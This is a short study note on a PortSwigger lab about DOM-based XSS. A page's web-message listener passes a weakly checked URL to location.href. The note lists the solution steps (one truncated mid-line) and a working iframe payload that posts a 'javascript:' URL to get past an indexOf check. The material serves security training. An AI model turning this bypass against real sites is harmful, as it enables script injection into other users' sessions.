# Lab: DOM XSS using web messages and a JavaScript URL

**Official lab:** [https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)

## Lab idea

This lab combines web messaging with DOM-based redirection involving a JavaScript URL. It practices assessing how message validation and client-side navigation interact, and why weak URL checks can create unsafe behavior.

## Vulnerability in brief
The Document Object Model (DOM) is the browser’s structured representation of a page and its elements. DOM manipulation is routine; vulnerabilities arise when client-side JavaScript takes attacker-controllable data from a **source** and passes it unsafely to a potentially dangerous **sink**. This topic is a family of client-side vulnerability classes, not a general learning or testing category. DOM-based cross-site scripting is commonly abbreviated **DOM XSS**.

## Solution idea
1. Notice that the home page contains an addEventListener() call that listens for a web message.
2. Go to the exploit server and add the following iframe to the body, remembering to replace YOUR-LAB-ID with your lab ID: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/"…
3. Store the exploit and deliver it to the victim.

## Payloads / key values
- `addEventListener()`
- `indexOf()`
- `"http:"`
- `"https:"`
- `location.href`
- `iframe`
- `YOUR-LAB-ID`
- `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
- `targetOrigin`
- `postMessage()`
- `print()`

## Official source
- [PortSwigger Academy: Lab: DOM XSS using web messages and a JavaScript URL](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url)
